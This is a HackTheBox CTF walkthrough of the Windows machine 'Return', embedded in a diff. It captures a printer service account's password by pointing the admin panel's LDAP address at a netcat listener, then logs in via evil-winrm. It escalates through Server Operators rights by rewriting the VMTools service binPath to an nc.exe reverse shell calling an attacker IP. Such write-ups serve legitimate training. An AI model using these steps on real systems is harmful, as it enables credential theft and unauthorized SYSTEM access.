@@ -1,0 +1,78 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Return HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/return-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-10-18T20:38:39+00:00">October 18, 2022</time><time class="updated" datetime="2025-06-19T14:05:13+00:00">June 19, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Return is a Windows machine on HTB and is rated as easy, this box is designed over windows that have<span style="color: #0000ff;"><strong> <a style="color: #0000ff;" href="https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/">Weak Service Permission</a></strong></span>. If summarized, we will abuse a printer admin portal to get hardcoded credentials through netcat and use them for WinRM login. The printer service account is a member of the Server Operators group which allows one to stop and start some services. Thus, we exploited weak configured services to execute our malicious exe file by abusing the Server Operators’ permission.</span></p>
+<h3><span style="color: #800000;">Table of content</span></h3>
+<p><span style="color: #000000;"><strong>Initial Access</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Enumeration</span></li>
+<li><span style="color: #000000;">Credential Dumping</span></li>
+<li><span style="color: #000000;">WinRM Valid Account</span></li>
+<li><span style="color: #000000;">User Flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Abusing weak service permission</span></li>
+<li><span style="color: #000000;">Root lag</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s deep dive into this.</span></p>
+<h3><span style="color: #800000;">Initial Access</span></h3>
+<p><span style="color: #000000;">First, we do a Nmap scan of the machine’s IP address to find the open ports and observed some ports are open, from Microsoft Services we understood its Windows Operating System.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC 10.129.31.219</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhGjvTOshLo6CMe_t2gZa7W9HCpv4WV6_-iahD_VQBOFxsWjvoEoNoNLavU51c5g4yq5nFlW38sYYa0QvT5b6bqMMT1JLN0GzeVRm5GinHo2wAMTQ3OGRWrya0VzdwYlTMNIPVdAFNsjowwvzEBn8zzkHHBD309svFynqNc9PdqwSHNELwIcH6GLJCFZQ/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;"><u>Enumeration</u></span></h3>
+<p><span style="color: #000000;">Since port 80 is open, let’s try to access the IP address via a browser.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhwOIWykpghBfzPAhdRPJpU34X0rmyZA6vsFTK5_A4ih1cMip2ORQbAZaAY1HOfQ5nhGmfSM5kIj-zx4mOaXbzKSlBsUztdHT-Z3sZ5FsaVMJuBGXAOWsUWNvUuVbTb7Vj6IEAwh6IsWHhrHNnrrM5jnftlX1Bjzti12URUYEVt_uNBB0CVZvr6ESajrw/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">As you can see, we have access to a printer admin panel. The pages are running PHP. Let’s navigate to the setting tab.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNyliMp2_RLQZrkSQud_5EISnalHjdZuImW3YB0iPIbP0JNVXxpgKTv6dkO53k3LimLSdMNLntt9GsBmc1QK-9IYKTsV3GFQlQp6RNV3wtuBJgzzkQ_yO37eszWL124DWNZwr5_aCrzM6hp5zjSSN3PqJm3UW2nz2R7Jm_ih4194eLL3G00YruRejxlA/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">The above setting shows us the username which is <strong>svc-printer</strong> and the hardcoded password which has been masked. The server address field is the only field that works as a parameter then the update button is pressed. So the printer is communicating with the local address on port 389.</span></p>
+<p><span style="color: #000000;">What if we replace the server address with the attacking machine IP address using port 389?</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh8UY23M9GeHQ5R7291nmXeLQO3Poyw6LAqrec00JDbOZo9XjIyFgDfwHn_Z1Q49DmhGG1-HJzDQxkLDIPTHd0gJYwcMEXZzX1elAPXxbeKanEoYYCy-VCdFqhoSJ6YLMHpUjFzxKRLXUrXhhU9Gz4QYyCvLkWNNlb24PhyYPaC8XMWaXNzwYYZnn7Y7g/s16000/4.png"/></span></p>
+<h3><span style="color: #000000;"><u><span style="color: #800000;">Credential Dumping</span> </u></span></h3>
+<p><span style="color: #000000;">Once we have replaced the server address from the attacker’s IP (Kali Linux), we launched Netcat listener on port 389 on our kali machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 389</pre>
+<p><span style="color: #000000;">Once we hit the update button, we obtained the password “1edFg43012!!”</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEisphyQLOOcHWZSf5Z6TkgKIHa1pmwjZKenVF2N3AtypKlWisoWak8WHIlwjtg4zM7P2lM9LwCbtH_cbsWJXw0OUeAOq5pStK-990zdtTKw1Wf2tpfjQBqLQixr2i6OHZt0Umne_sMVsPtvWgn8CpidQP55nqm53SMt0M1MJxFuzwSYDi8nKJpTA-s_2w/s16000/5.png"/></span></p>
+<h4><span style="color: #000000;"><u>WinRM Valid Account </u></span></h4>
+<p><span style="color: #000000;">Let’s use evil-winrm to establish a remote connection. This can be done by issuing the command below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">evil-winrm -i 10.129.31.219 -u svc-printer -p "1edFg43012!!"</pre>
+<p><span style="color: #000000;">We have access to the server. Let’s browser to the desktop directory and see if we can find any flags. Indeed, as shown in the above screenshot, we can find the user.txt flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgahb42P7LaJVrxOh3rTOnuBGMfpmPsAnuqfGlDyJb0ZZ_7yhc1E36Fr-rqTAhqaKT3fC9XfmzjCV9Hsw34KsHMvug0jVkkQxooDoChXL7d4nibfem1sKCKp-rvAUfo4Qhq-0ivbny40ONFge-w6WnjCQjC1wVRyKTXYo6vmTpDcZq6IIAEp_DyrFVz5Q/s16000/8.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Privilege Escalation</span> </span></h3>
+<p><span style="color: #000000;">Now that we have access to the machine, let’s verify which user permission or group we have.</span></p>
+<p><span style="color: #000000;">To verify this, we issue the command<strong> net user svc-printer</strong></span></p>
+<p><span style="color: #000000;">From the screenshot below, we can see that the actual user is a member of the <strong>server operators</strong> group.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh6JuVX4J26K252iLBwUQM4mxNQPUbEVLUtO6Q1jkti5cQykkMTyl1FFYDoMAJuV4hm8_ssGPwI9i1IjgPbO46PpU-ciSumMTu9WIkFHeg0Ye_Qm6IhAzL9zWzKx5JjhonVHfmOjWroE7ZA3KFt_K-yDfJhraxYDb5w6gGTAP5K-EUzPpRUbocZQzUpsg/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">What can a user with a Server Operators group membership do?</span></p>
+<p><span style="color: #000000;">The server operators can start and stop services.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEia8YhLQAD-ZjWNCGdw5YtcBFCrCBZru3K-yrBiUpFC6TGMUT7PaHg4SrmS1ToGcqNyziw7oSOtbXKtR7In00e1VPde9fMH9JAkTX2VuPDL_2xUfmlPcuO7aS2mqgs-FnT-qbtrmlzMLyx_zN2Manld6H-ukxzGr49e4Pe7E1Fooo2vQGNK6PyzZxP7dA/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">The server Operator group is considered a service administrator and can change binaries that are installed on the domain controller, read more from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">here</a></strong></span>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">upload /usr/share/windows-binaries/nc.exe</pre>
+<p><span style="color: #000000;">Thus, we first uploaded the nc.exe windows binaries file and then enumerate for installed services for further exploitation.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">services</pre>
+<p><span style="color: #000000;">we found a list of installed services and their path along with true/false flags for privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgGse_wongHJC9xqlrbH6Sklc57ve4xfr70-xLmN7cr35jHQJ9wwn4hEdXiQLHAqE4jWmKoKlmgNNzRrssDvVghSAVI4D-Q-n4Mq0ZHjUuDVNkJt9yiGAHnAQA89q4mR55mvP5etNxlCBkAFlyyxqsc0NfyE3V0h-nPE5_-hgjQKGFilT4dpDqspKnT0A/s16000/11.png"/></span></p>
+<h4><span style="color: #000000;"><u>Abusing Weak Service Permission</u></span></h4>
+<p><span style="color: #000000;">Here we need to analyse which binary path we can modify to execute nc.exe file</span></p>
+<p><span style="color: #000000;">First, we try windows defender to change the binary path for WinDefend but got an access denied error.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc.exe config WinDefend binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.93 1234"</pre>
+<p><span style="color: #000000;">Then we try to modify the binary path for VMTools and finally this worked for us.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc.exe config VMTools binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.14.93 1234"</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnXZf0fpFSQM8xcF0JJEkkml812FoVYRsY50b3ADmfqNGfFbu0qBnMEEWsv--YetbpapBkrEfh4x6XS6gFjWJQPC5Gwkmy-lDhugnuPAJKpViCv1xyK2ANUxhVtYzBJDG53JFksz6aftoygWog_GKNFQaWZImLfBINXGOMuKuZBLN9-G_vlY2R0UDG9A/s16000/12.png"/></p>
+<p><span style="color: #000000;">Since SVC-printer is a member of the server operator thus we can restart the service to get the reverse connection. So, let’s stop and start the service VMTools by issuing the command:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sc.exe stop VMTools
+sc.exe start VMTools</pre>
+<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdMkwu9XoP8zyzwv_XBRLsXYe2a1okCwgJYah_rQ8ToviQwx5471DE729ItO4pHZD6HVz1Vu9-8uZjuBPDUb4_ob1yWjXHp-40inI0SYz5rgtQCjTi2sB4Xy4COKxsH9fFuwnvFdtpY5Nty7fKATnW-Wvtg_qE8CtrujZpLCwh5vkSMfxdhMyakaIVrw/s16000/13.png"/></p>
+<p><span style="color: #000000;">Before starting the service VMTools, we make sure that the netcat is listening on port 1234 as shown below.</span></p>
+<p><span style="color: #000000;">Once we stop the service and start it again, we get a netcat session to obtain the Root flag. </span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhaSE-VRpB650T4fiy8uuQ7RMKc_JkmKDuh_4v2sPxfOsjwTlYYASafVRv9uGjstmUsIZq39AeNPG0tejbLWFxN3PK-Ichoic2t3xkyMBqMpUxuK1nidEHKaY2W9-2fMQ-AIXyA6YyduFsiDELXoBw6ch8ahMU_S4B4GMsNIUHxFJWa2wwHAkGZZlKDiA/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Tirut Hawoldar is a Cyber Security Enthusiast and CTF player with 15 years of experience in IT Security and Infrastructure. Contact on <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.linkedin.com/in/tirut-hawoldar-72b67214/"><strong>LinkedIn</strong></a></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
